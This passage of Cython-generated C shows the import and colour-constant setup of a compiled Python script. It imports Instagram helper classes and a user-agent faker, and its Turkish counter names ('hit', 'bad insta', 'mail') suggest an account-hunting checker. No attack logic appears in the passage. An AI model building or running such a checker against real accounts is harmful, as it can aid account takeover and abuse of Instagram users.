  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_1) < 0) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_requests, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_1) < 0) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_json, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_1) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_uuid, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_1) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_hashlib, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hashlib, __pyx_t_1) < 0) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_UserAgent);
  __Pyx_GIVEREF(__pyx_n_s_UserAgent);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_UserAgent);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_fake_useragent, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_UserAgent); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_UserAgent, __pyx_t_1) < 0) __PYX_ERR(0, 21, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_threading, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_threading, __pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_2) < 0) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_time, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 24, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_pycountry, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_pycountry, __pyx_t_2) < 0) __PYX_ERR(0, 25, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_token_hex);
  __Pyx_GIVEREF(__pyx_n_s_token_hex);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_token_hex);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_secrets, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_token_hex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_token_hex, __pyx_t_2) < 0) __PYX_ERR(0, 26, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_InfoIG);
  __Pyx_GIVEREF(__pyx_n_s_InfoIG);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_InfoIG);
  __Pyx_INCREF(__pyx_n_s_RestInsta);
  __Pyx_GIVEREF(__pyx_n_s_RestInsta);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_n_s_RestInsta);
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_ms4, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_InfoIG); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_InfoIG, __pyx_t_1) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_RestInsta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RestInsta, __pyx_t_1) < 0) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_Import(__pyx_n_s_string, 0, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_string, __pyx_t_2) < 0) __PYX_ERR(0, 29, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_n_s_Queue);
  __Pyx_GIVEREF(__pyx_n_s_Queue);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_Queue);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_queue, __pyx_t_2, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_Queue); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Queue, __pyx_t_2) < 0) __PYX_ERR(0, 30, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      
      __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_INCREF(__pyx_n_s_generate_user_agent);
      __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
      PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_generate_user_agent);
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_1, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_2, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_1);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_1) < 0) __PYX_ERR(0, 32, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L7_try_end;
    __pyx_L2_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_7) < 0) __PYX_ERR(0, 33, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_GOTREF(__pyx_t_7);

      
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 34, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 34, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__63, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 34, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

      
      __pyx_t_8 = PyList_New(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 35, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_n_s_generate_user_agent);
      __Pyx_GIVEREF(__pyx_n_s_generate_user_agent);
      PyList_SET_ITEM(__pyx_t_8, 0, __pyx_n_s_generate_user_agent);
      __pyx_t_9 = __Pyx_Import(__pyx_n_s_user_agent_2, __pyx_t_8, 0); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 35, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_ImportFrom(__pyx_t_9, __pyx_n_s_generate_user_agent); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 35, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_8);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_generate_user_agent, __pyx_t_8) < 0) __PYX_ERR(0, 35, __pyx_L4_except_error)
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      goto __pyx_L3_exception_handled;
    }
    goto __pyx_L4_except_error;
    __pyx_L4_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L3_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
    __pyx_L7_try_end:;
  }

  
  __pyx_t_7 = PyList_New(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_INCREF(__pyx_n_s_time);
  __Pyx_GIVEREF(__pyx_n_s_time);
  PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_time);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_time, __pyx_t_7, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_time); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_7) < 0) __PYX_ERR(0, 36, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_n_s_md5);
  __Pyx_GIVEREF(__pyx_n_s_md5);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_n_s_md5);
  __pyx_t_7 = __Pyx_Import(__pyx_n_s_hashlib, __pyx_t_1, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_ImportFrom(__pyx_t_7, __pyx_n_s_md5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_md5, __pyx_t_1) < 0) __PYX_ERR(0, 37, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

  
  __pyx_t_7 = PyList_New(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_INCREF(__pyx_n_s_randrange);
  __Pyx_GIVEREF(__pyx_n_s_randrange);
  PyList_SET_ITEM(__pyx_t_7, 0, __pyx_n_s_randrange);
  __Pyx_INCREF(__pyx_n_s_choice);
  __Pyx_GIVEREF(__pyx_n_s_choice);
  PyList_SET_ITEM(__pyx_t_7, 1, __pyx_n_s_choice);
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_random, __pyx_t_7, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_randrange); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_randrange, __pyx_t_7) < 0) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_ImportFrom(__pyx_t_1, __pyx_n_s_choice); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_choice, __pyx_t_7) < 0) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_hit_dustu, __pyx_int_0) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_int_0) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_orta_mail, __pyx_int_0) < 0) __PYX_ERR(0, 40, __pyx_L1_error)

  
  __pyx_t_1 = __pyx_kp_u_94m;
  __Pyx_INCREF(__pyx_t_1);
  __pyx_t_7 = __pyx_kp_u_0m;
  __Pyx_INCREF(__pyx_t_7);
  __pyx_t_2 = __pyx_kp_u_1m;
  __Pyx_INCREF(__pyx_t_2);
  __pyx_t_9 = __pyx_kp_u_93m;
  __Pyx_INCREF(__pyx_t_9);
  __pyx_t_8 = __pyx_kp_u_91m;
  __Pyx_INCREF(__pyx_t_8);
  __pyx_t_10 = __pyx_kp_u_92m;
  __Pyx_INCREF(__pyx_t_10);
  __pyx_t_11 = __pyx_kp_u_96m;
  __Pyx_INCREF(__pyx_t_11);
  __pyx_t_12 = __pyx_kp_u_95m;
  __Pyx_INCREF(__pyx_t_12);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BLUE, __pyx_t_1) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RESET, __pyx_t_7) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BOLD, __pyx_t_2) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_YELLOW, __pyx_t_9) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RED, __pyx_t_8) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_GREEN, __pyx_t_10) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_CYAN, __pyx_t_11) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_MAGENTA, __pyx_t_12) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_E, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 42, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_G, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 43, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 44, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Q, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 45, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_X, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 46, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Z1, __pyx_kp_u_2_31m) < 0) __PYX_ERR(0, 47, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_F, __pyx_kp_u_2_32m) < 0) __PYX_ERR(0, 48, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_A, __pyx_kp_u_2_34m) < 0) __PYX_ERR(0, 49, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C, __pyx_kp_u_2_35m) < 0) __PYX_ERR(0, 50, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_B, __pyx_kp_u_38_5_208m) < 0) __PYX_ERR(0, 51, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Y, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 52, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_M, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 53, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_S, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 54, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_U, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 55, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BRed, __pyx_kp_u_1_31m) < 0) __PYX_ERR(0, 56, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BGreen, __pyx_kp_u_1_32m) < 0) __PYX_ERR(0, 57, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BYellow, __pyx_kp_u_1_33m) < 0) __PYX_ERR(0, 58, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_R, __pyx_kp_u_1_34m) < 0) __PYX_ERR(0, 59, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BPurple, __pyx_kp_u_1_35m) < 0) __PYX_ERR(0, 60, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BCyan, __pyx_kp_u_1_36m) < 0) __PYX_ERR(0, 61, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BWhite, __pyx_kp_u_1_37m) < 0) __PYX_ERR(0, 62, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BLUE, __pyx_kp_u_94m) < 0) __PYX_ERR(0, 63, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RESET, __pyx_kp_u_0m) < 0) __PYX_ERR(0, 64, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_BOLD, __pyx_kp_u_1m) < 0) __PYX_ERR(0, 65, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_YELLOW, __pyx_kp_u_93m) < 0) __PYX_ERR(0, 66, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_RED, __pyx_kp_u_91m) < 0) __PYX_ERR(0, 67, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_GREEN, __pyx_kp_u_92m) < 0) __PYX_ERR(0, 68, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_CYAN, __pyx_kp_u_96m) < 0) __PYX_ERR(0, 69, __pyx_L1_error)

  
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_MAGENTA, __pyx_kp_u_95m) < 0) __PYX_ERR(0, 70, __pyx_L1_error)

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_12 = PyList_New(1); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 72, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_12);
      __Pyx_INCREF(__pyx_n_s_render);
      __Pyx_GIVEREF(__pyx_n_s_render);
      PyList_SET_ITEM(__pyx_t_12, 0, __pyx_n_s_render);
      __pyx_t_11 = __Pyx_Import(__pyx_n_s_cfonts, __pyx_t_12, 0); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 72, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __pyx_t_12 = __Pyx_ImportFrom(__pyx_t_11, __pyx_n_s_render); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 72, __pyx_L10_error)
      __Pyx_GOTREF(__pyx_t_12);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_render, __pyx_t_12) < 0) __PYX_ERR(0, 72, __pyx_L10_error)
      __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L15_try_end;
    __pyx_L10_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __pyx_t_6 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
    if (__pyx_t_6) {
      __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
